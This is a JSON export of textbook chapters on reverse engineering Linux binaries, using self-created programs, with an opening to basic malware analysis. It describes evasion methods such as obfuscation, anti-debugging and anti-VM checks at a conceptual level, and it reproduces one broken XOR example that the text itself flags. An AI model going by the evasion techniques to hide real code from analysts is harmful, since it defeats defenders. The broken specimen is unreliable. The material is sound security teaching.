        "content": "Reverse engineering (RE) is the process of taking a compiled binary and understanding its underlying logic, data structures, and algorithms without access to the original source code. It is used in:\n\n- Software interoperability: Understanding file formats or protocols.\n- Security analysis: Finding vulnerabilities, malware analysis, exploit development.\n- Legacy software maintenance: Recovering lost source code or documenting behavior.\n- Competitive analysis: Understanding how a product works (subject to legal constraints).\n- Education: Learning how compilers translate high-level constructs to machine code.\n\nIn this chapter, we focus on the fundamentals: tools, methodologies, and recognition of common patterns. We'll use Linux x86-64 binaries as examples, but the concepts apply to other platforms."
      },
      {
        "id": "sec-26-1-1",
        "title": "26.1.1 Legal and Ethical Considerations",
        "content": "Reverse engineering is often legally restricted by End User License Agreements (EULAs), copyright law, and trade secret protections. In some jurisdictions, it may be permissible for interoperability or security research under specific conditions (e.g., the DMCA exemption for security testing). Always ensure you have permission or are operating within legal boundaries. This chapter is for educational purposes only.\n\nClarification: This overview is not a universal statement of permission or prohibition. Specific exceptions, contracts and applicable laws require case-specific review; all runnable exercises here analyze programs created by the learner."
      },
      {
        "id": "sec-26-2",
        "title": "26.2 Setting Up a Reverse Engineering Environment",
        "content": "A typical RE environment on Linux includes:\n\n- Disassemblers: objdump, ndisasm, radare2 (r2), Ghidra (GUI), IDA Pro (commercial).\n- Debuggers: gdb (with GEF or pwndbg extensions), radare2 (with debugger), ltrace, strace.\n- Binary analysis tools: readelf, nm, strings, file, ldd, checksec.\n- Hex editors: xxd, hexdump, 010 Editor.\n- Decompilers: Ghidra (free), IDA (commercial), retdec (open source).\n\nInstall common tools:\n\nClarification: Package availability varies by distribution; the combined apt command is illustrative. Check apt-cache policy for your distribution and use the official project installation instructions when packages are absent. The GEF path must point to the actual checked-out gef.py; source a reviewed local file explicitly in GDB before changing persistent configuration.",
        "codeSnippets": [
          {
            "language": "bash",
            "title": "26.2 Setting Up a Reverse Engineering Environment — listing 1",
            "code": "sudo apt install gdb radare2 ghidra strace ltrace binutils",
            "explanation": "GEF (GDB Enhanced Features) adds useful commands for RE:"
          },
          {
            "language": "bash",
            "title": "26.2 Setting Up a Reverse Engineering Environment — listing 2",
            "code": "git clone https://github.com/hugsy/gef.git\necho \"source /path/to/gef.py\" >> ~/.gdbinit",
            "explanation": "Pwndbg is another popular GDB extension."
          }
        ]
      },
      {
        "id": "sec-26-3",
        "title": "26.3 Static Analysis Methodology",
        "content": "Static analysis examines the binary without running it. Steps:\n\n1. Identify file type: file program (ELF, PE, etc.)\n2. Check security properties: checksec --file=program (RELRO, stack canary, NX, PIE)\n3. Extract strings: strings -a program (look for interesting messages, URLs, file names)\n4. List symbols: nm program (if not stripped)\n5. View sections and headers: readelf -S, readelf -l, readelf -d\n6. Disassemble: objdump -d -M intel program\n7. Analyze functions: identify entry point, main, etc. Using a disassembler with function detection (e.g., radare2 with aaa, or Ghidra's auto-analysis).\n8. Reconstruct control flow: draw CFG or use tooling.\n\nClarification: A mitigation report describes binary properties, not proof that a program is secure. Stripping usually removes .symtab/debug data while retaining dynamic symbols required for linking; ordinary strip does not generally remove section headers."
      },
      {
        "id": "sec-26-3-1",
        "title": "26.3.1 Function Identification",
        "content": "In stripped binaries, function boundaries are not explicitly marked. Heuristics:\n- Prologue patterns: push rbp; mov rbp, rsp or sub rsp, N.\n- Call targets (addresses that are targets of call instructions).\n- Alignment padding (functions often aligned to 16 bytes).\n- Cross-references: code that jumps to the start of a block likely indicates a function.\nTools like Ghidra/radare2 perform function detection automatically.\n\nClarification: Function detection is heuristic. Tail jumps, shared blocks, omitted prologues and data embedded in executable sections can mislead it. Label inferred functions provisionally and confirm with callers and control flow."
      },
      {
        "id": "sec-26-3-2",
        "title": "26.3.2 Recognizing the Main Function",
        "content": "In ELF executables, entry point is _start, which calls __libc_start_main (in dynamically linked programs). The main function address is passed as an argument to __libc_start_main. In stripped binaries, you can locate it via the call to __libc_start_main or by finding the function that receives argc/argv.\n\nExample:\n\nClarification: The startup example is a historical glibc pattern, not a universal ELF requirement. Current builds may pass zero for init/fini; statically linked libc programs can still call __libc_start_main. Custom assembly can use a different entry point entirely.",
        "codeSnippets": [
          {
            "language": "text",
            "title": "26.3.2 Recognizing the Main Function — listing 1",
            "code": "_start:\n    xor     ebp, ebp\n    mov     r9, rdx         ; rtld_fini\n    pop     rsi             ; argc\n    mov     rdx, rsp        ; argv\n    and     rsp, -16\n    push    rax\n    push    rsp\n    lea     r8, [__libc_csu_fini]\n    lea     rcx, [__libc_csu_init]\n    lea     rdi, [main]     ; address of main\n    call    __libc_start_main",
            "explanation": "Here main is passed in rdi."
          }
        ]
      },
      {
        "id": "sec-26-4",
        "title": "26.4 Dynamic Analysis Methodology",
        "content": "Dynamic analysis involves running the binary and observing its behavior."
      },
      {
        "id": "sec-26-4-1",
        "title": "26.4.1 Tracing with strace and ltrace",
        "content": "- strace ./program shows system calls (file opens, network, process creation).\n- ltrace ./program shows library calls (if dynamically linked and using PLT)."
      },
      {
        "id": "sec-26-4-2",
        "title": "26.4.2 Debugging with GDB",
        "content": "- Set breakpoints at suspected functions (break *0x4005d0).\n- Run with run, step with si/ni.\n- Examine registers, memory, stack.\n- Use watchpoints to catch data modifications.\n- Dump memory regions (dump memory file start end).\n\nGDB with GEF/Pwndbg provides enhanced views: stack, registers, disassembly, and heap.\n\nClarification: Use dump binary memory file start end for an explicit raw memory dump. Absolute breakpoints must use mapped runtime addresses for PIE; starti and info proc mappings help establish load bias."
      },
      {
        "id": "sec-26-4-3",
        "title": "26.4.3 Using radare2 for Dynamic Analysis",
        "content": "radare2 -d ./program starts a debugger. Commands:\n- aaa – analyze all\n- afl – list functions\n- pdf @ main – disassemble main\n- db 0x4005d0 – set breakpoint\n- dc – continue\n- dr – show registers"
      },
      {
        "id": "sec-26-5",
        "title": "26.5 Recognizing High-Level Constructs in Assembly",
        "content": ""
      },
      {
        "id": "sec-26-5-1",
        "title": "26.5.1 Conditional Statements",
        "content": "If-else:",
        "codeSnippets": [
          {
            "language": "text",
            "title": "26.5.1 Conditional Statements — listing 1",
            "code": "cmp eax, ebx\njle .L2\n; if body\njmp .L3\n.L2:\n; else body\n.L3:",
            "explanation": "Often optimized with cmov for simple assignments."
          }
        ]
      },
      {
        "id": "sec-26-5-2",
        "title": "26.5.2 Loops",
        "content": "While loop:",
        "codeSnippets": [
          {
            "language": "text",
            "title": "26.5.2 Loops — listing 1",
            "code": ".Lloop:\n    test eax, eax\n    jz .Lend\n    ; body\n    jmp .Lloop\n.Lend:",
            "explanation": "For loop often uses a counter register (ecx, rdi) with inc/dec and conditional jump."
          }
        ]
      },
      {
        "id": "sec-26-5-3",
        "title": "26.5.3 Switch Statements",
        "content": "Look for jump tables: an array of addresses indexed by the switch expression. Or decision tree (series of comparisons)."
      },
      {
        "id": "sec-26-5-4",
        "title": "26.5.4 Function Calls",
        "content": "- Arguments in registers (rdi, rsi, rdx, rcx, r8, r9).\n- Return in eax/rax.\n- Stack alignment: sub rsp, 8 before call if needed."
      },
      {
        "id": "sec-26-5-5",
        "title": "26.5.5 Data Structures",
        "content": "- Arrays: indexed addressing [base + index*scale] or pointer increments.\n- Structs: base+offset access, often with offsets like [rdi+8], [rdi+16].\n- Linked lists: pointer chasing mov rax, [rax+8]."
      },
      {
        "id": "sec-26-6",
        "title": "26.6 Data Structure Reconstruction",
        "content": "From memory access patterns, you can infer the layout of structures."
      },
      {
        "id": "sec-26-6-1",
        "title": "26.6.1 Example: Identifying a Struct",
        "content": "Suppose you see:\n\nClarification: Offsets and operand widths constrain a proposed layout but do not uniquely identify a struct or type. The accesses could also refer to adjacent array elements or a byte buffer.",
        "codeSnippets": [
          {
            "language": "text",
            "title": "26.6.1 Example: Identifying a Struct — listing 1",
            "code": "mov eax, [rdi]      ; field at offset 0\nadd eax, [rdi+4]    ; field at offset 4\nmov [rdi+8], eax    ; field at offset 8",
            "explanation": "You can infer a struct with at least three members, likely of 4-byte sizes (int).\n\nIf offsets are 0, 8, 16, etc., likely 64-bit fields."
          }
        ]
      },
      {
        "id": "sec-26-6-2",
        "title": "26.6.2 Identifying Arrays",
        "content": "If you see a base pointer in a register and an index multiplied by element size, it's an array.\n\nClarification: Scaled addressing is evidence of repeated-width access, not proof of an int array; a float, uint32_t or packed record can have the same width.",
        "codeSnippets": [
          {
            "language": "text",
            "title": "26.6.2 Identifying Arrays — listing 1",
            "code": "mov eax, [rax + rcx*4]   ; array of 4-byte ints",
            "explanation": "Pointer incrementing by a constant size also indicates array traversal."
          }
        ]
      },
      {
        "id": "sec-26-7",
        "title": "26.7 Dealing with Stripped Binaries",
        "content": "Many binaries are stripped, removing symbol names and sometimes section headers (for static). You must rely on heuristics.\n\nClarification: Ordinary stripping preserves metadata needed by the loader. Dynamic symbols, relocations, unwind data and strings may remain useful even when local names disappear."
      },
      {
        "id": "sec-26-7-1",
        "title": "26.7.1 Finding Function Boundaries",
        "content": "Tools like Ghidra and radare2 use recursive descent and heuristics. Manually, look for:\n- ret instructions followed by alignment padding.\n- Prologue patterns (push rbp, sub rsp, ...).\n- Targets of call instructions."
      },
      {
        "id": "sec-26-7-2",
        "title": "26.7.2 Identifying Main in Stripped Binary",
        "content": "As described earlier, locate _start (entry point from ELF header), then trace the call to __libc_start_main. The first argument to that call is main.\n\nOr search for typical main prologue and references to standard library functions like printf, exit, etc."
      },
      {
        "id": "sec-26-7-3",
        "title": "26.7.3 Renaming Functions and Variables",
        "content": "During analysis, you can rename functions and variables in Ghidra/radare2 to meaningful names as you understand their purpose."
      },
      {
        "id": "sec-26-8",
        "title": "26.8 Introduction to Ghidra and radare2",
        "content": ""
      },
      {
        "id": "sec-26-8-1",
        "title": "26.8.1 Ghidra",
        "content": "Ghidra is a free, open-source reverse engineering framework developed by the NSA. It includes:\n- Disassembler and decompiler (produces C pseudocode).\n- Graph view for CFG.\n- Scripting (Java/Python) for automation.\n- Support for many architectures.\n\nBasic workflow:\n1. Create a new project.\n2. Import the binary.\n3. Run auto-analysis.\n4. Explore functions, decompile, rename."
      },
      {
        "id": "sec-26-8-2",
        "title": "26.8.2 radare2",
        "content": "radare2 is a command-line driven RE framework with a powerful command set.\n\nCommon commands:\n- r2 -A ./program – analyze all\n- afl – list functions\n- s main – seek to main\n- pdf – print disassembly of current function\n- izz – list strings\n- vv – visual mode\n- ood – reopen in debug mode\n- db – breakpoint"
      },
      {
        "id": "sec-26-9",
        "title": "26.9 Practical Example: Reverse Engineering a Simple Keygen",
        "content": "We'll analyze a small program that checks a password and prints \"Access granted\" if correct. We'll find the correct password using static and dynamic analysis.\n\nSource (for reference, unknown to analyst):\n\nClarification: This is a self-created password checker, despite the keygen title. Build with -fno-builtin-strcmp when following the dynamic comparison exercise so the call is retained. strace and ltrace show only paths executed with the selected inputs.",
        "codeSnippets": [
          {
            "language": "c",
            "title": "26.9 Practical Example: Reverse Engineering a Simple Keygen — listing 1",
            "code": "#include <stdio.h>\n#include <string.h>\nint main(int argc, char **argv) {\n    if (argc != 2) { printf(\"Usage: %s <password>\\n\", argv[0]); return 1; }\n    if (strcmp(argv[1], \"secret\") == 0) {\n        printf(\"Access granted\\n\");\n        return 0;\n    } else {\n        printf(\"Access denied\\n\");\n        return 1;\n    }\n}",
            "explanation": "Compile stripped:"
          },
          {
            "language": "bash",
            "title": "26.9 Practical Example: Reverse Engineering a Simple Keygen — listing 2",
            "code": "gcc -O0 -s keygen.c -o keygen"
          }
        ]
      },
      {
        "id": "sec-26-9-1",
        "title": "26.9.1 Static Analysis with radare2",
        "content": "\n\nClarification: Enter r2 -A ./keygen in the shell; afl, s main and pdf are radare2 commands. A stripped file may lack a recognized main name; use the inferred address and document how it was found.",
        "codeSnippets": [
          {
            "language": "bash",
            "title": "26.9.1 Static Analysis with radare2 — listing 1",
            "code": "r2 -A ./keygen\nafl   # list functions\ns main\npdf",
            "explanation": "We see main's disassembly. Look for comparisons with strings. Use izz to list strings: \"Usage: %s <password>\\n\", \"secret\", \"Access granted\\n\", \"Access denied\\n\". The string \"secret\" is likely the password.\n\nBut suppose strings are not stored in plaintext (e.g., XOR-encoded). We would need dynamic analysis."
          }
        ]
      },
      {
        "id": "sec-26-9-2",
        "title": "26.9.2 Dynamic Analysis with GDB",
        "content": "Run under GDB, set breakpoint at strcmp (if dynamic linking):\n\nClarification: A strcmp breakpoint can encounter dynamic-loader comparisons before the application call. Inspect the call site and argument strings to confirm the relevant hit; IFUNC implementations may have different symbol names. Use x/s $rdi and x/s $rsi at the confirmed call.",
        "codeSnippets": [
          {
            "language": "gdb",
            "title": "26.9.2 Dynamic Analysis with GDB — listing 1",
            "code": "break strcmp\nrun wrongpassword",
            "explanation": "Examine arguments: rsi points to \"secret\", rdi points to input. So password is \"secret\".\n\nIf static, break at the comparison location found in disassembly."
          },
          {
            "language": "bash",
            "title": "Reproducible checker inspection",
            "code": "gcc -O0 -g -fno-builtin-strcmp keygen.c -o keygen.debug\ncp keygen.debug keygen\nstrip keygen\nreadelf -h keygen\nreadelf -d keygen\nstrings -a keygen\nobjdump -d -M intel keygen",
            "explanation": "Keep the debug copy as ground truth after the blind analysis. Try no argument, wrongpassword and secret; expected exit statuses are 1,1,0."
          }
        ]
      }
    ],
    "exercises": [
      {
        "id": "ex-26-1",
        "title": "Exercise 26.1: Basic Static Analysis",
        "description": "Create a simple C program (e.g., that prints \"Hello\" and exits). Compile with -O0 -s. Use file, strings, readelf, objdump to analyze. Identify main and the printf call.",
        "solution": "cat > hello.c <<'C'\n#include <stdio.h>\nint main(void) { printf(\"Hello\\n\"); return 0; }\nC\ngcc -O0 -g -fno-builtin-printf hello.c -o hello.debug\ncp hello.debug hello\nstrip hello\nfile hello\nstrings -a hello\nreadelf -hW hello\nreadelf -dW hello\nobjdump -d -M intel hello\n# Compare your inferred main with the ground truth only after analysis:\nnm -n hello.debug\nobjdump -d -M intel --disassemble=main hello.debug",
        "solutionExplanation": "\nOriginal source guidance: - file hello: ELF 64-bit LSB executable, x86-64, stripped.\n- strings hello: shows \"Hello\" and possibly other library strings.\n- nm hello: no symbols (stripped).\n- readelf -h: entry point.\n- objdump -d: disassemble _start and find call to __libc_start_main, then find main address. Default GCC may produce PIE (ET_DYN). -fno-builtin-printf retains the requested printf call instead of a puts substitution.",
        "solutionLanguage": "bash"
      },
      {
        "id": "ex-26-2",
        "title": "Exercise 26.2: Function Identification",
        "description": "Strip a binary with multiple functions. Use radare2 or objdump to list functions. Manually identify prologues and epilogues. Count how many functions you can find.",
        "solution": "cat > functions.c <<'C'\n#include <stdio.h>\n__attribute__((noinline)) int twice(int x) { return x*2; }\n__attribute__((noinline)) int plus_three(int x) { return x+3; }\nint main(void) { printf(\"%d\\n\", plus_three(twice(4))); return 0; }\nC\ngcc -O0 -g -fno-inline functions.c -o functions.debug\ncp functions.debug functions\nstrip functions\nobjdump -d -M intel functions\nreadelf --debug-dump=frames functions\n# Record candidate addresses and evidence before consulting:\nnm -n functions.debug\n# Optional inside r2 -A ./functions: afl",
        "solutionExplanation": "\nOriginal source guidance: Use objdump -d and look for patterns: push rbp; mov rbp,rsp; ... ret. Note alignment and call targets. radare2 -A with afl will do automatically. The source defines three functions, but the executable also has startup/runtime functions. Report which count you mean and how many candidates were verified; objdump disassembles code but does not reliably recover stripped function names.",
        "solutionLanguage": "bash"
      },
      {
        "id": "ex-26-3",
        "title": "Exercise 26.3: Dynamic Tracing",
        "description": "Use strace on a program that opens a file. Identify the filename and flags from the trace. Use ltrace to see library calls.",
        "solution": "cat > fileopen.c <<'C'\n#include <stdio.h>\nint main(int argc, char **argv) {\n    if (argc!=2) return 2;\n    FILE *f=fopen(argv[1],\"r\");\n    if (!f) return 1;\n    return fclose(f)!=0;\n}\nC\ngcc -O0 -g fileopen.c -o fileopen\nprintf 'sample\\n' > sample.txt\nstrace -e trace=open,openat,close ./fileopen sample.txt\n# If ltrace is installed:\n# ltrace -e fopen+fclose ./fileopen sample.txt",
        "solutionLanguage": "bash",
        "solutionExplanation": "strace ./fileopen myfile.txt shows:\n\nltrace shows fopen if using C library.\nOriginal source guidance: open(\"myfile.txt\", O_RDONLY) = 3 Modern libc commonly implements fopen through openat(AT_FDCWD,...,O_RDONLY). Descriptor 3 is only illustrative; compare the actual trace and distinguish loader file opens from sample.txt."
      },
      {
        "id": "ex-26-4",
        "title": "Exercise 26.4: Switch Statement Reconstruction",
        "description": "Write a C function with a switch statement (0-4). Compile with -O2. Disassemble and determine if a jump table is used. Identify the table and its entries.",
        "solution": "// Save as dispatch.c; gcc -O2 -c dispatch.c -o dispatch.o\n// objdump -dr -M intel dispatch.o\n// objdump -s -j .rodata dispatch.o; readelf -rW dispatch.o\nextern int case0(void),case1(void),case2(void),case3(void),case4(void);\nint dispatch(int x) {\n    switch(x) {\n    case 0: return case0(); case 1: return case1();\n    case 2: return case2(); case 3: return case3();\n    case 4: return case4(); default: return -1;\n    }\n}",
        "solutionExplanation": "\nOriginal source guidance: Disassemble and look for jmp rax or jmp [table + reg*8]. The table is in .rodata, containing addresses of case handlers. Separate external case functions prevent constant-return arithmetic folding. GCC may choose signed 32-bit relative entries in .rodata rather than eight-byte absolute pointers. Consult relocations before interpreting unlinked table bytes. If no table is emitted, describe the observed decision tree instead.",
        "solutionLanguage": "c"
      },
      {
        "id": "ex-26-5",
        "title": "Exercise 26.5: Struct Layout",
        "description": "Write a C program that defines a struct with fields: int a; char b; double c;. Write a function that returns the value of c. Compile with -O0 and -O2, disassemble, and determine the offset of c in both cases. Explain any differences due to optimization.",
        "solution": "#include <stddef.h>\n#include <stdio.h>\nstruct S { int a; char b; double c; };\ndouble get_c(struct S *s) { return s->c; }\nint main(void) {\n    struct S s={1,2,3.5};\n    printf(\"offset=%zu size=%zu value=%.1f\\n\",offsetof(struct S,c),sizeof s,get_c(&s));\n    return 0;\n}\n// gcc -O0 -g layout.c -o layout-O0\n// gcc -O2 -g layout.c -o layout-O2\n// objdump -d -M intel --disassemble=get_c layout-O0\n// objdump -d -M intel --disassemble=get_c layout-O2",
        "solutionExplanation": "\nOriginal source guidance: At -O0, offset likely 16 (int at 0, char at 4, 3 bytes padding to align double at 8, then double at 8, total size 16). At -O2, offset may still be 8 or 16; the compiler may pack if not required, but ABI alignment requires 8 for double, so offset is 8 in both. However, the function might just load from [rdi+8] directly. Correction: ordinary SysV AMD64 layout has c at offset 8 and total size 16 at both optimization levels. Optimization does not silently pack this externally visible structure; the return value is in XMM0.",
        "solutionLanguage": "c"
      }
    ],
    "practiceQuestions": [
      {
        "question": "What is reverse engineering? What are its legitimate uses?",
        "answer": "Reverse engineering infers a system’s behavior and design from its artifacts. Uses include interoperability, debugging, recovering undocumented behavior, defensive security analysis and studying compiler output."
      },
      {
        "question": "What is the difference between static and dynamic analysis?",
        "answer": "Static analysis reads files without running their code; dynamic analysis observes a particular execution. Static results can overestimate reachable paths, while dynamic results cover only exercised paths. Combine both and record evidence."
      },
      {
        "question": "Which tools would you use to identify the entry point of an ELF binary? How about listing dynamic dependencies?",
        "answer": "readelf -h reports the ELF entry point. readelf -d lists DT_NEEDED direct dependencies without executing the binary; objdump -p also exposes dynamic metadata. ldd reports resolved dependencies but is unsuitable for unfamiliar inputs that could be executed by its implementation."
      },
      {
        "question": "How can you find the main function in a stripped binary?",
        "answer": "For a conventional glibc-linked program, follow startup code to __libc_start_main and track its first argument, RDI, to the candidate main address. Account for PIE load bias at runtime. Custom startup code need not use libc or main."
      },
      {
        "question": "What are some common prologue patterns, and why are they useful for function identification?",
        "answer": "push rbp; mov rbp,rsp and sub rsp,N are useful clues, along with call targets and unwind metadata. Optimized functions may omit these sequences or share epilogues; a single pattern does not establish a boundary."
      },
      {
        "question": "How would you reconstruct a switch statement's jump table from disassembly?",
        "answer": "Identify the index normalization and bounds check, find the table base and entry width, decode absolute addresses or signed relative offsets, and follow each destination. Distinguish a table of return values from a table used for an indirect jump."
      },
      {
        "question": "Describe how to identify a structure's field offsets from memory access instructions.",
        "answer": "Track accesses from the same object base and record offset, access width, signedness evidence and use. Then propose a layout that fits all observations, including padding. Offsets alone do not prove original field types or names."
      },
      {
        "question": "What is a decompiler? How does it differ from a disassembler?",
        "answer": "A decompiler infers higher-level pseudocode and types from instructions and control flow. A disassembler decodes instructions. Decompiled output is an analysis aid and may misidentify types, boundaries or control flow."
      },
      {
        "question": "In dynamic analysis, how can you observe system calls? Library calls?",
        "answer": "strace records system calls; ltrace can record dynamically linked library calls through supported mechanisms. Neither necessarily observes every internal or inlined library operation. GDB breakpoints allow inspection of arguments and results."
      },
      {
        "question": "What are the ethical/legal considerations when reverse engineering software?",
        "answer": "Work within authorization and applicable rules, respect confidentiality and document scope. Legal exceptions vary by jurisdiction and circumstances; the chapter examples use self-created binaries and are not a general legal determination."
      }
    ],
    "summary": [
      "Reverse engineering combines static and dynamic analysis to understand binaries.",
      "Legal and ethical considerations are paramount.",
      "Essential tools: file, strings, readelf, objdump, gdb, strace, radare2, Ghidra.",
      "Static analysis reveals structure and patterns; dynamic analysis shows runtime behavior.",
      "Recognizing high-level constructs (loops, if‑else, switch, structs) from assembly is key.",
      "Stripped binaries require heuristics and experience.",
      "Modern frameworks like Ghidra and radare2 greatly aid RE with decompilation and visualization.",
      "Practice with small, self-created programs to build skills.",
      "In the next chapter, we'll delve into understanding optimized binaries and basic malware analysis, applying these fundamentals."
    ]
  },
  {
    "id": 27,
    "slug": "chapter-27-optimized-binaries-malware-analysis",
    "level": 5,
    "levelTitle": "Low-Level Systems and Reverse Engineering",
    "title": "Chapter 27: Understanding Optimized Binaries and Basic Malware Analysis",
    "subtitle": "Obfuscation, Anti-Analysis, Persistence Mechanisms, and Simulated Keylogger Triage",
    "learningObjectives": [
      "Recognize compiler optimizations in disassembled binaries and understand their impact on reverse engineering.",
      "Identify common obfuscation and anti-analysis techniques used in malicious or protected software.",
      "Understand the goals and methodologies of malware analysis.",
      "Apply static analysis techniques to extract information from a suspected binary without executing it.",
      "Use dynamic analysis safely in a controlled environment to observe malware behavior.",
      "Recognize common malware behaviors and their assembly-level patterns.",
      "Perform a basic malware analysis workflow from triage to reporting.",
      "Develop an awareness of legal and ethical considerations when analyzing malicious software."
    ],
    "prerequisites": [
      "Solid understanding of x86-64 assembly, disassembly, and compiler output (Chapters 24–25).",
      "Familiarity with executable formats (ELF/PE) and system calls (Chapters 23, 16).",
      "Proficiency with reverse engineering tools: objdump, gdb, strace, radare2, etc. (Chapters 17, 26).",
      "Basic knowledge of operating system internals and networking concepts.",
      "A controlled, isolated environment (virtual machine) for malware analysis."
    ],
    "keyConcepts": [
      "Optimized binaries contain code transformed by the compiler to improve performance or reduce size; these transformations can obscure the original high-level logic.",
      "Obfuscation deliberately makes code harder to understand, often using control flow flattening, opaque predicates, and encryption.",
      "Anti-analysis techniques detect and thwart debuggers, virtual machines, and disassemblers.",
      "Malware analysis combines static and dynamic methods to understand malicious intent and behavior.",
      "Indicators of Compromise (IOCs) are artifacts like file hashes, domain names, registry keys, and mutex names that identify malware.",
      "Sandboxing executes malware in an isolated environment to observe behavior safely.",
      "Persistence mechanisms allow malware to survive reboots.",
      "Network communication often uses sockets, HTTP, and DNS for command-and-control.",
      "Process injection techniques hide malware within legitimate processes."
    ],
    "diagramType": "malware_analysis",
    "sections": [
      {
        "id": "sec-27-1",
        "title": "27.1 Recognizing Compiler Optimizations in Binaries",
        "content": "Compiler optimizations (Chapter 24) significantly alter the generated assembly, making reverse engineering more challenging. Understanding these patterns helps distinguish intentional code from compiler artifacts and recover the original logic."
      },
      {
        "id": "sec-27-1-1",
        "title": "27.1.1 Common Optimization Patterns Revisited",
        "content": "- Inlining: Small functions are embedded into callers, eliminating call/ret overhead. Look for repeated code blocks that would otherwise be separate functions.\n- Tail call elimination: A function ending with a call to another function may be replaced by jmp to that function, reusing the current stack frame.\n- Loop unrolling: Loops are duplicated multiple times to reduce branch frequency. The loop body appears repeated with different offsets or register usage.\n- Constant folding: Expressions with known constant values are computed at compile time, leaving only the result.\n- Strength reduction: Multiplication by constants is replaced by shifts and additions (e.g., lea sequences).\n- Dead code elimination: Unreachable or unused code is removed, so some source-level constructs may have no assembly representation.\n- Vectorization: Loops over arrays are transformed to use SIMD instructions (SSE/AVX), operating on multiple data elements per instruction.\n- Instruction scheduling: Instructions are reordered to avoid pipeline stalls, breaking the natural source order. This can make it hard to map back to C.\n\nWhen reversing optimized code, focus on the overall algorithm rather than instruction-by-instruction correspondence. Use decompilers that can partially undo these transformations."
      },
      {
        "id": "sec-27-1-2",
        "title": "27.1.2 Impact on Reverse Engineering",
        "content": "Optimized code often:\n- Uses registers aggressively, with few stack accesses.\n- Omits frame pointers (when compiled with -fomit-frame-pointer, default at -O1+), making local variable identification harder.\n- Merges or reorders source constructs (e.g., combining two loops into one).\n- Employs branchless code (cmov, setcc) for simple conditionals.\n\nTo deal with optimized binaries:\n- Use decompilers (Ghidra, IDA) that produce C pseudocode.\n- Annotate and rename variables as you understand them.\n- Focus on data flow and control flow graphs rather than individual instructions."
      },
      {
        "id": "sec-27-2",
        "title": "27.2 Obfuscation and Anti-Analysis Techniques",
        "content": "Malware authors and software protectors employ obfuscation to hide their code’s purpose and resist analysis. These techniques go beyond compiler optimizations and are intentionally designed to confuse."
      },
      {
        "id": "sec-27-2-1",
        "title": "27.2.1 Code Obfuscation",
        "content": "- Control flow flattening: The function’s control flow is converted into a state machine (dispatcher with switch), obscuring the actual sequence of blocks.\n- Opaque predicates: Conditional branches that always evaluate to a fixed value but are not obvious to the analyst, splitting code into dead paths.\n- Dead code insertion: Useless instructions inserted to slow analysis and inflate code size.\n- Instruction substitution: Replacing simple instructions with equivalent but more complex sequences (e.g., xor eax, eax replaced by mov eax, 0 or push 0; pop eax).\n- String encryption: Strings are stored encrypted and decrypted at runtime, hiding messages and API names.\n- API hashing: Instead of importing function names, malware computes hashes of names and resolves functions dynamically via GetProcAddress/dlsym.\n- Packing/Encryption: The entire code section is compressed or encrypted, and a small unpacker stub decrypts it at runtime.\n\nClarification: These substitutions are not equivalent in every context: XOR updates flags while MOV does not; push 0 / pop eax is not encodable in 64-bit mode. API hashing often walks export tables; GetProcAddress and dlsym ordinarily take names, not arbitrary hashes.",
        "codeSnippets": [
          {
            "language": "nasm",
            "title": "Original source: Solution 27.5",
            "code": "char msg[] = {0x2b,0x3a,0x3c,0x3c,0x3f,0x3,0x37,0x3f,0x3a,0x3c,0x2c,0x24}; // XOR \"Hello, World!\" with 0x4\nfor (int i=0; i<sizeof(msg); i++) msg[i] ^= 0x4;\nputs(msg);",
            "explanation": "Original source XOR specimen: bytes do not encode the claimed message and no NUL terminator is provided. See the complete corrected toy decoder in Exercise 27.5."
          }
        ]
      },
      {
        "id": "sec-27-2-2",
        "title": "27.2.2 Anti-Debugging",
        "content": "- ptrace detection: On Linux, malware may call ptrace(PTRACE_TRACEME) to detect if already being traced.\n- int 0x2D or int 3 with special handling: Use software breakpoints to detect debuggers.\n- Timing checks: Measure execution time; debugged code runs slower.\n- Self-modifying code: Code that changes itself, which can break breakpoints or disassembly.\n\nClarification: A failed PTRACE_TRACEME call can have causes other than a debugger. Timing differences also arise from scheduling and load; record observations rather than treating one signal as conclusive."
      },
      {
        "id": "sec-27-2-3",
        "title": "27.2.3 Anti-VM and Sandbox Detection",
        "content": "- Check for VM-specific hardware (CPU manufacturer string, MAC addresses, registry keys).\n- Use sidt/sgdt instructions to detect hypervisor presence.\n- Detect known sandbox artifacts (files, processes, registry entries).\n\nClarification: Descriptor-table and hardware fingerprints are platform-dependent heuristics, not reliable universal VM detectors. CPU vendor and hypervisor identification are different fields."
      },
      {
        "id": "sec-27-2-4",
        "title": "27.2.4 Anti-Disassembly",
        "content": "- Inserting junk bytes that confuse linear sweep disassemblers but are skipped by control flow.\n- Using overlapping instructions (jump into the middle of an instruction).\n- Obfuscated imports to hide which APIs are used.\n\nWhen encountering obfuscation, dynamic analysis is often more effective because the code must eventually execute and reveal its true behavior."
      },
      {
        "id": "sec-27-3",
        "title": "27.3 Introduction to Malware Analysis",
        "content": "Malware analysis is the process of examining malicious software to understand its capabilities, origin, and impact. It is a crucial skill in cybersecurity for incident response, threat intelligence, and prevention."
      },
      {
        "id": "sec-27-3-1",
        "title": "27.3.1 Types of Malware",
        "content": "- Virus: Attaches to legitimate programs and replicates when executed.\n- Worm: Self-replicating over networks.\n- Trojan: Disguised as legitimate software, performs malicious actions in background.\n- Ransomware: Encrypts files and demands payment.\n- Spyware: Monitors user activity and steals information.\n- Adware: Displays unwanted ads, often bundled with spyware.\n- Rootkit: Hides its presence and provides privileged access.\n- Bot: Controlled remotely as part of a botnet."
      },
      {
        "id": "sec-27-3-2",
        "title": "27.3.2 Goals of Malware Analysis",
        "content": "- Understand what the malware does (functionality).\n- Identify indicators of compromise (IOCs) for detection.\n- Develop signatures and detection rules.\n- Determine the extent of damage and remediation steps.\n- Attribute the malware to a threat actor (advanced)."
      },
      {
        "id": "sec-27-3-3",
        "title": "27.3.3 Analysis Approaches",
        "content": "- Static analysis: Examine the binary without executing it. Safe but may be limited by obfuscation.\n- Dynamic analysis: Run the malware in a controlled environment and observe its behavior. More revealing but riskier; requires isolation.\n- Hybrid: Use both, often starting with static to gain initial understanding, then dynamic to confirm and extend.\n\nClarification: Static tools avoid running the sample’s instructions but still parse potentially malformed input. Dynamic observations cover only the executed path and may miss delayed or environment-dependent behavior."
      },
      {
        "id": "sec-27-4",
        "title": "27.4 Static Malware Analysis Techniques",
        "content": "Static analysis is the first step. It is safe (no execution) and can quickly reveal useful information."
      },
      {
        "id": "sec-27-4-1",
        "title": "27.4.1 Basic Triage",
